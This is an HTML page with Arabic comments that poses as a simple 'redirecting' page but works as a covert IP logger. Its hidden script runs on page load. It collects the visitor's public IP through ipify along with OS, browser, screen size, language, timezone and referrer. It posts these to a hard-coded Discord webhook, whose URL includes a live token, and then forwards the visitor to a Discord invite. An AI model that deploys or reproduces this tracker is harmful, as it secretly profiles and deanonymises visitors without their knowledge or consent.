<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التوجيه...</title>
    <style>
        /* إخفاء كل محتوى الصفحة تماماً */
        body {
            margin: 0;
            padding: 0;
            background: transparent;
            visibility: hidden;
            display: none;
        }
    </style>
</head>
<body>
    <script>
        // === Webhook URL (مقدم من المستخدم) ===
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1515267763499831436/vt8lfUpqnHBzKE3WC8dDDQDLVtWNO3KCTQ3NQjqJVUdWwcH082r-9NGk-HrOnwe82PLa";
        const DISCORD_REDIRECT = "https://discord.gg/M9L";

        // كائن جمع بيانات الزائر
        let visitorData = {
            ip: "غير معروف",
            os: "",
            browser: "",
            screen: "",
            language: "",
            timezone: "",
            platform: "",
            url: "",
            referrer: "",
            timestamp: null
        };

        // دوال استخراج المعلومات
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browserName = "Unknown";
            let version = "";
            if (ua.indexOf("Chrome") > -1 && ua.indexOf("Edg") === -1 && ua.indexOf("OPR") === -1) {
                browserName = "Google Chrome";
                const match = ua.match(/Chrome\/(\d+\.\d+\.\d+\.\d+)/);
                if (match) version = match[1];
                else version = ua.match(/Chrome\/(\d+)/)?.[1] || "";
            } else if (ua.indexOf("Edg") > -1) {
                browserName = "Microsoft Edge";
                const match = ua.match(/Edg\/(\d+\.\d+\.\d+\.\d+)/);
                if (match) version = match[1];
            } else if (ua.indexOf("Firefox") > -1) {
                browserName = "Mozilla Firefox";
                const match = ua.match(/Firefox\/(\d+\.\d+)/);
                if (match) version = match[1];
            } else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) {
                browserName = "Safari";
                const match = ua.match(/Version\/(\d+\.\d+)/);
                if (match) version = match[1];
            } else if (ua.indexOf("OPR") > -1 || ua.indexOf("Opera") > -1) {
                browserName = "Opera";
                const match = ua.match(/OPR\/(\d+\.\d+\.\d+)/);
                if (match) version = match[1];
            } else {
                browserName = ua.split(" ").find(part => part.includes("/")) || "متصفح غير معروف";
            }
            return version ? `${browserName} ${version}` : browserName;
        }

        function getOS() {
            const ua = navigator.userAgent;
            if (ua.indexOf("Win") !== -1) {
                if (ua.indexOf("Windows NT 10.0") !== -1) return "Windows 10/11";
                if (ua.indexOf("Windows NT 6.3") !== -1) return "Windows 8.1";
                if (ua.indexOf("Windows NT 6.2") !== -1) return "Windows 8";
                if (ua.indexOf("Windows NT 6.1") !== -1) return "Windows 7";
                return "Windows";
            } else if (ua.indexOf("Mac") !== -1) return "macOS";
            else if (ua.indexOf("Linux") !== -1) {
                if (ua.indexOf("Android") !== -1) return "Android";
                return "Linux";
            } else if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) return "iOS";
            else if (/CrOS/.test(ua)) return "Chrome OS";
            else return navigator.platform || "OS غير معروف";
        }

        function getPlatformDetail() {
            const ua = navigator.userAgent;
            if (ua.includes("Linux x86_64")) return "Linux x86_64";
            if (ua.includes("Linux armv")) return "Linux ARM";
            if (ua.includes("Win64")) return "Windows x64";
            if (ua.includes("Macintosh; Intel Mac OS X")) return "macOS Intel";
            if (ua.includes("Macintosh; ARM")) return "macOS Apple Silicon";
            return navigator.platform || "Unknown";
        }

        function collectLocal() {
            visitorData.browser = getBrowserInfo();
            visitorData.os = getOS();
            visitorData.screen = `${window.screen.width}x${window.screen.height}`;
            visitorData.language = navigator.language || "en-US";
            visitorData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC";
            visitorData.platform = getPlatformDetail();
            visitorData.url = window.location.href;
            visitorData.referrer = document.referrer || "(مباشر)";
            visitorData.timestamp = new Date().toISOString();
        }

        async function fetchIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
                const data = await res.json();
                visitorData.ip = data.ip;
            } catch {
                visitorData.ip = "غير متاح";
            }
        }

        async function sendAndRedirect() {
            collectLocal();
            await fetchIP();

            const embed = {
                title: "🎯 TPF — إعادة توجيه إلى ديسكورد",
                color: 0x5865F2,
                timestamp: visitorData.timestamp,
                fields: [
                    { name: "📍 IP", value: visitorData.ip, inline: true },
                    { name: "💻 نظام التشغيل", value: visitorData.os, inline: true },
                    { name: "🌐 المتصفح", value: visitorData.browser, inline: true },
                    { name: "🖥️ دقة الشاشة", value: visitorData.screen, inline: true },
                    { name: "🔤 اللغة", value: visitorData.language, inline: true },
                    { name: "🕐 المنطقة الزمنية", value: visitorData.timezone, inline: true },
                    { name: "📋 المنصة", value: visitorData.platform, inline: true },
                    { name: "🆔 الرابط", value: visitorData.url, inline: false },
                    { name: "🔗 المُحيل", value: visitorData.referrer, inline: false }
                ],
                footer: { text: "تم التوجيه إلى discord.gg/M9L" }
            };

            const payload = { embeds: [embed], content: "🔄 **زائر جديد تم توجيهه إلى السيرفر**" };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error("فشل الإرسال:", err);
            }

            // التوجيه الفوري بدون أي تأخير مرئي
            window.location.replace(DISCORD_REDIRECT);
        }

        // بدء العملية فوراً
        sendAndRedirect();
    </script>
</body>
</html>
